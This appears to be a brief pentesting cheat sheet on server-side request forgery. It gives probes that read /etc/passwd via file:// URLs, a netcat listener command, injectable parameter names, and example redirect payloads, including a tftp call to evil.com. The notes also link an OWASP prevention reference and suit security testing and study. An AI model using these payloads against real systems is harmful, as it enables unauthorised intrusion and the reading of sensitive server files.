Could be used to check ```file:///etc/passwd```,
or ```nc -lnvp 8888``` to check if request is going from server side.
(if this matches could be used for SSRF)
Or from client (burp pro have collaborator)
Could be used for scanning internal network and local ports according to errors
https://xip.io could be used as dns wildcard
http://somesite.com.xip.io

https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf

Burp collaborator

psychoPATH - https://github.com/ewilded/psychoPATH

Common Parameters | Injection points
------------ | ------------
file= | folder=
location= | style=
locale= | template=
path= | doc=
display= | source=
load= | pdf= 
read= | dest=
retrieve= | continue=


### SSRF GET example
https://some.com/redirect.php?url=http://google.com
https://some.com/redirect.php?url=//google.com
https://some.com/redirect.php?url=google.com
https://some.com/redirect.php?url=/path/something/here

https://some.com/redirect.php?url=file:///etc/passwd
https://some.com/ssrf.php?url=tftp://evil.com:12345/testpacket